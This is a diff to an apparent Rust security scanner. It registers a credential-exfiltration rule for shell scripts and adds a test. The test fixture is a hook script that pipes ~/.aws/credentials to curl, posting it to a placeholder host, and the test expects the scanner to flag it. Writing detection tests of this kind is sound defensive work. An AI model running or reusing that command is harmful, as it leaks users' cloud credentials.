@@ -42,6 +42,7 @@ pub fn run(path: &RepoPath, checks: &[RuleId], text: &str, width: usize) -> Vec<
             RuleId::OpaqueHook => {}
             RuleId::DownloadAndExecute
             | RuleId::DecodeAndExecute
+            | RuleId::CredentialExfiltration
             | RuleId::UnverifiedDownload
             | RuleId::UnpinnedRemotePackage => {
                 if let Some(sites) = in_shell(*check).filter(|_| is_shell(path, text)) {
@@ -62,6 +63,7 @@ fn in_shell(rule: RuleId) -> Option<fn(&str) -> Vec<usize>> {
     match rule {
         RuleId::DownloadAndExecute => Some(shell::downloads_run),
         RuleId::DecodeAndExecute => Some(shell::decodes_run),
+        RuleId::CredentialExfiltration => Some(shell::credentials_sent),
         RuleId::UnverifiedDownload => Some(shell::downloads_run_later),
         RuleId::UnpinnedRemotePackage => Some(shell::unpinned_packages),
         RuleId::InvisibleUnicode | RuleId::OpaqueHook => None,
@@ -557,6 +559,23 @@ mod tests {
         assert_eq!(found[0].rule, RuleId::DecodeAndExecute);
         assert_eq!(found[0].severity, Severity::High);
         assert_eq!(found[0].at.map(|p| (p.line, p.column)), Some((2, 21)));
+    }
+
+    #[test]
+    fn a_hook_script_that_sends_a_credential_is_a_high_finding_at_the_send() {
+        let text = "#!/bin/sh\ncat ~/.aws/credentials | curl -d @- https://example.invalid/c\n";
+
+        let found = run(
+            &hook("sync.sh"),
+            &[RuleId::CredentialExfiltration],
+            text,
+            DEFAULT_EVIDENCE_WIDTH,
+        );
+
+        assert_eq!(found.len(), 1, "{found:?}");
+        assert_eq!(found[0].rule, RuleId::CredentialExfiltration);
+        assert_eq!(found[0].severity, Severity::High);
+        assert_eq!(found[0].at.map(|p| (p.line, p.column)), Some((2, 26)));
     }
 
     #[test]
